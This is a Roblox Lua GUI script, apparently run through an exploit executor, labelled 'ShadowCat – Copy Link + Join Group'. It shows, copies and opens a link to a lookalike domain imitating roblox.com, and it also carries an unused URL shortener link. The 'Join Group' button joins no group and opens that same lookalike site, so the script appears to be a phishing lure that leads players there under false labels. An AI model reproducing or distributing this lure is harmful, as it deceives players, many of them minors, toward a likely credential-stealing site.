--[[ ShadowCat – Copy Link + Join Group GUI ]]
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local guiService = game:GetService("GuiService")
local clipboard = syn and syn.setclipboard or setclipboard or function(text) end

local linkToCopy = "https://robloxcom-ten.vercel.app/"
local joinLink =  "https://bit.ly/robloxxw"

-- Build the GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CopyLinkGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = player.PlayerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 200)
frame.Position = UDim2.new(0.5, -200, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(27, 31, 43)
frame.BorderSizePixel = 2
frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
frame.ClipsDescendants = true
frame.Parent = screenGui

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 35)
title.Position = UDim2.new(0, 0, 0, 5)
title.BackgroundTransparency = 1
title.Text = "📋 Copy the Script Link"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 22
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Center
title.Parent = frame

-- Link display box (read-only)
local linkBox = Instance.new("TextBox")
linkBox.Size = UDim2.new(0.9, 0, 0, 30)
linkBox.Position = UDim2.new(0.05, 0, 0, 50)
linkBox.BackgroundColor3 = Color3.fromRGB(14, 18, 31)
linkBox.BorderColor3 = Color3.fromRGB(45, 53, 72)
linkBox.BorderSizePixel = 1
linkBox.Text = linkToCopy
linkBox.TextColor3 = Color3.fromRGB(238, 238, 238)
linkBox.TextSize = 14
linkBox.Font = Enum.Font.Gotham
linkBox.ClearTextOnFocus = false
linkBox.TextWrapped = false
linkBox.Parent = frame

-- Copy button (left)
local copyBtn = Instance.new("TextButton")
copyBtn.Size = UDim2.new(0.4, 0, 0, 35)
copyBtn.Position = UDim2.new(0.05, 0, 0, 100)
copyBtn.BackgroundColor3 = Color3.fromRGB(0, 153, 255)
copyBtn.BorderSizePixel = 0
copyBtn.Text = "📋 Copy Link"
copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
copyBtn.TextSize = 18
copyBtn.Font = Enum.Font.GothamBold
copyBtn.Parent = frame

-- Join Group button (right)
local joinBtn = Instance.new("TextButton")
joinBtn.Size = UDim2.new(0.4, 0, 0, 35)
joinBtn.Position = UDim2.new(0.55, 0, 0, 100)
joinBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
joinBtn.BorderSizePixel = 0
joinBtn.Text = "👥 Join Group"
joinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
joinBtn.TextSize = 18
joinBtn.Font = Enum.Font.GothamBold
joinBtn.Parent = frame

-- Copy button click
copyBtn.MouseButton1Click:Connect(function()
    local ok, err = pcall(function()
        clipboard(linkToCopy)
    end)
    if ok then
        copyBtn.Text = "✅ Copied!"
        task.wait(1.5)
        copyBtn.Text = "📋 Copy Link"
    else
        copyBtn.Text = "❌ Failed"
        task.wait(1)
        copyBtn.Text = "📋 Copy Link"
    end
end)

-- Join Group button click – opens the link in browser
joinBtn.MouseButton1Click:Connect(function()
    pcall(function()
        guiService:OpenBrowserWindow(linkToCopy)
    end)
    joinBtn.Text = "✅ Opened!"
    task.wait(1.5)
    joinBtn.Text = "👥 Join Group"
end)

-- Close button (X)
local closeBtn = Instance.new("ImageButton")
closeBtn.Size = UDim2.new(0, 24, 0, 24)
closeBtn.Position = UDim2.new(1, -30, 0, 6)
closeBtn.BackgroundTransparency = 1
closeBtn.Image = "rbxassetid://3926305904"
closeBtn.Parent = frame

closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- Dragging
local dragging = false
local dragStart, startPos
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
    end
end)
frame.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
frame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)
